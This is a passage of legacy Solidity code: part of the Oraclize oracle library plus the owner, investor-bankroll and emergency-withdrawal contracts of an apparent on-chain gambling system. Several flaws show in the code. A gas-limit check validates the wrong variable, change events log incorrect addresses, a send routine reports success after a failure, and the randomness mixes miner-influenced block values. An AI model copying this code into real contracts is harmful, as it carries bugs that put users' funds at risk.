ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce;\n bytes memory sessionKeyHash;\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"f5557abbf544c3db784d84e777d3ca2894372d5ae761c74aa9266231225f156c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract LedgerProofVerifyI {\n function external_oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) public;\n function external_oraclize_randomDS_proofVerify(bytes proof, bytes32 queryId, bytes result, string context_name) public returns (bool);\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner {\n assert(msg.sender == owner);\n _;\n }\n function Owned() {\n owner = msg.sender;\n }\n}\ncontract oraclizeSettings is Owned {\n uint constant ORACLIZE_PER_SPIN_GAS_LIMIT = 6100;\n uint constant ORACLIZE_BASE_GAS_LIMIT = 200000;\n uint safeGas = 9000;\n event newGasLimit(uint _gasLimit);\n function setSafeGas(uint _gas)\n onlyOwner\n {\n assert(ORACLIZE_BASE_GAS_LIMIT + safeGas >= ORACLIZE_BASE_GAS_LIMIT);\n assert(safeGas <= 25000);\n safeGas = _gas;\n newGasLimit(_gas);\n }\n}\ncontract HouseManaged is Owned {\n address public houseAddress;\n bool public isStopped;\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n modifier onlyIfNotStopped {\n assert(!isStopped);\n _;\n }\n modifier onlyIfStopped {\n assert(isStopped);\n _;\n }\n function HouseManaged() {\n houseAddress = msg.sender;\n }\n function stop_or_resume_Contract(bool _isStopped)\n onlyOwner {\n isStopped = _isStopped;\n }\n function changeHouse_and_Owner_Addresses(address newHouse, address newOwner)\n onlyOwner {\n assert(newHouse != address(0x0));\n assert(newOwner != address(0x0));\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n houseAddress = newHouse;\n LOG_HouseAddressChanged(houseAddress, newHouse);\n }\n}\ncontract usingInvestorsModule is HouseManaged, oraclizeSettings {\n uint constant MAX_INVESTORS = 5;\n uint constant divestFee = 50;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n event LOG_InvestorEntrance(address investor, uint amount);\n event LOG_InvestorCapitalUpdate(address investor, int amount);\n event LOG_InvestorExit(address investor, uint amount);\n event LOG_EmergencyAutoStop();\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_FailedSend(address addr, uint value);\n event LOG_SuccessfulSend(address addr, uint value);\n modifier onlyMoreThanMinInvestment {\n assert(msg.value > getMinInvestment());\n _;\n }\n modifier onlyMoreThanZero {\n assert(msg.value != 0);\n _;\n }\n modifier onlyInvestors {\n assert(investorIDs[msg.sender] != 0);\n _;\n }\n modifier onlyNotInvestors {\n assert(investorIDs[msg.sender] == 0);\n _;\n }\n modifier investorsInvariant {\n _;\n assert(numInvestors <= MAX_INVESTORS);\n }\n modifier onlyIfProfitNotDistributed {\n if (!profitDistributed) {\n _;\n }\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == MAX_INVESTORS) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private\n onlyIfProfitNotDistributed {\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n if (copyInvested + investors[i].amountInvested >= copyInvested)\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == MAX_INVESTORS) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if ((invested >= investors[currentID].amountInvested)) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function safeSend(address addr, uint value)\n internal {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n}\ncontract EmergencyWithdrawalModule is usingInvestorsModule {\n uint constant EMERGENCY_WITHDRAWAL_RATIO = 80;\n uint constant EMERGENCY_TIMEOUT = 3 days;\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n WithdrawalProposal public proposedWithdrawal;\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address withdrawalAddress, uint amountWithdrawn);\n event LOG_EmergencyWithdrawalVote(address investor, bool vote);\n modifier onlyAfterProposed {\n assert(proposedWithdrawal.toAddress != 0);\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n assert(proposedWithdrawal.atTime + EMERGENCY_TIMEOUT <= now);\n _;\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= EMERGENCY_WITHDRAWAL_RATIO * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n revert();\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete 